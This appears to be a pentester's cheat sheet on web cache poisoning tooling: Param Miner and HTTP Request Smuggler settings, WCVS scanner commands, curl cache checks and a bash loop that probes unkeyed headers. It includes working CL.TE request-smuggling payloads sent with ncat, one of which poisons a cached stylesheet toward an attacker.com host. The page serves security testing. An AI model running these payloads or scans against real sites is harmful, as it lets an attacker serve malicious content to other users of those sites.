---
aliases:
  - WCVS
  - Web Cache Vulnerability Scanner
tags:
  - vuln/cache-poisoning
  - technique/discovery
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Web Cache Poisoning]]"
  - "[[Burp Suite]]"
  - "[[Param Miner]]"
---
# Web Cache Poisoning - Tooling

---

## Param Miner (Burp Extension)

| **Herramienta / Acción** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp → Extensions → BApp Store → "Param Miner" → Install | Setup extension | Primera vez. |
| Right-click cacheable request → "Guess headers" | Auto-discover unkeyed headers | Single click. |
| Right-click → "Guess params" | Discover query params ocultos | Cache key analysis. |
| Param Miner → Settings → "Force cache miss" → ON | Auto cache buster | Reliable detection. |
| Param Miner → Settings → "Reflect to attack" → ON | Highlight reflected inputs | Pre-XSS hint. |
| Param Miner → Settings → "Probe twice to confirm" → ON | Reduce false positives | Reliability. |
| Param Miner → Settings → custom wordlist file | Append custom headers | Extender lista. |
| Param Miner → Output panel | Findings + reflection markers | Post-scan review. |
| Burp Active Scan + Param Miner enabled | Comprehensive cache poison detection | Full audit. |
^wcp-tool-param-miner

---

## HTTP Request Smuggler (Combo)

| **Herramienta / Acción** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp → BApp Store → "HTTP Request Smuggler" → Install | Setup extension | Pre-requisito HRS detection. |
| Right-click request → "HTTP Request Smuggler" → "Detect" | Auto-detect HRS desync | Identify vector. |
| Right-click request → "HTTP Request Smuggler" → "Smuggle attack" | Setup smuggle attack panel | Interactivo. |
| Smuggle attack → seleccionar "Cache poisoning" mode | Smuggle response cacheada en otra URL | HRS + cache combo. |
| Send to Repeater post-smuggle → re-fetch URL legit | Validate cache poison persiste | Confirmation. |
| `printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /poisoned-path HTTP/1.1\r\nX-Forwarded-Host: attacker\r\n\r\n' \| ncat target 80` | Manual CL.TE smuggle con cache poison | Sin Burp. |
^wcp-tool-smuggler

### HRS + cache poison workflow

```bash
# 1. Identificar HRS vector
# Burp Repeater → "Send group → single connection" con CL.TE probe

# 2. Smuggle response cacheable como path target
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /static/x.css HTTP/1.1\r\nHost: attacker.com\r\nX-Forwarded-Host: attacker.com\r\n\r\n' | ncat target.com 80

# 3. Refetch normal
curl -sI https://target.com/static/x.css | grep -i x-cache

# 4. Verifica response cacheada con Host attacker
```

---

## Web Cache Vulnerability Scanner (WCVS)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner && cd Web-Cache-Vulnerability-Scanner && go build -o wcvs main.go` | Install + compile WCVS | Primera vez. |
| `./wcvs -u https://target/` | Default scan completo | Quick scan. |
| `./wcvs -u https://target/ -v` | Verbose output | Debug + log. |
| `./wcvs -u https://target/ -hd "Cookie: session=$T"` | Authenticated scan | Endpoints con auth. |
| `./wcvs -u https://target/ -t 10` | 10 threads paralelos | Speed up. |
| `./wcvs -u https://target/ -o results.json` | JSON output reportable | Bug bounty. |
| `./wcvs -u https://target/ --test xss-host` | Solo specific test | Targeted. |
| `./wcvs -u https://target/ -w custom-headers.txt` | Custom wordlist unkeyed | Extender coverage. |
| `./wcvs -uri-list urls.txt -t 20` | Bulk multiple URLs | Volume scan. |
^wcp-tool-wcvs

---

## Manual curl / Burp Repeater

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `URL="https://target/page?cb=$(date +%s)" && curl -sI "$URL" \| grep -iE 'x-cache\|age:' && curl -sI "$URL" \| grep -iE 'x-cache\|age:'` | Verifica cacheable (segundo request HIT) | Initial check. |
| `curl -sI -H "X-Probe: poison" "$URL"; curl -sI "$URL" \| grep -i probe` | Probe header unkeyed + verifica reflexión cached | Single header test. |
| Burp Repeater → "Send group → in single connection" | Para HRS combos | Multi-request sync. |
| Burp Comparer → send 2 responses → Words/Bytes diff | Visual response diff | Detection oracle. |
| `diff <(curl -s "$URL") <(curl -s -H "X-Forwarded-Host: x" "$URL")` | Bash diff inline | Sin Burp. |
| `curl -sI "$URL" \| grep -iE 'cf-cache-status\|x-cache\|age\|cache-control'` | Identificar cache layer (CF/Akamai/Varnish/etc) | Pre-attack recon. |
| ZAP → Tools → "Manual Request Editor" + Add-on cache poisoning | OWASP ZAP free alternative | Sin Burp. |
^wcp-tool-manual

### Workflow manual completo

```bash
TARGET="https://target/page"
HEADERS=(
  "X-Forwarded-Host"
  "X-Forwarded-Scheme"
  "X-Forwarded-Proto"
  "X-Forwarded-For"
  "X-Original-Url"
  "X-Rewrite-Url"
  "X-Forwarded-Server"
  "Forwarded"
  "X-Host"
  "X-Real-IP"
  "X-Originating-IP"
  "Origin"
  "Referer"
  "User-Agent"
)

for h in "${HEADERS[@]}"; do
  CB=$(date +%s%N)
  URL="$TARGET?cb=$CB"

  R1=$(curl -s -H "$h: cache-poison-probe" "$URL")
  R2=$(curl -s "$URL")

  if [ "$(echo "$R1" | wc -c)" != "$(echo "$R2" | wc -c)" ]; then
    echo "[!] $h → response length differs (potential unkeyed)"
  fi

  if echo "$R2" | grep -q "cache-poison-probe"; then
    echo "[!!!] $h → header REFLECTED en cached response — POISONING CONFIRMED"
  fi
done
```

---
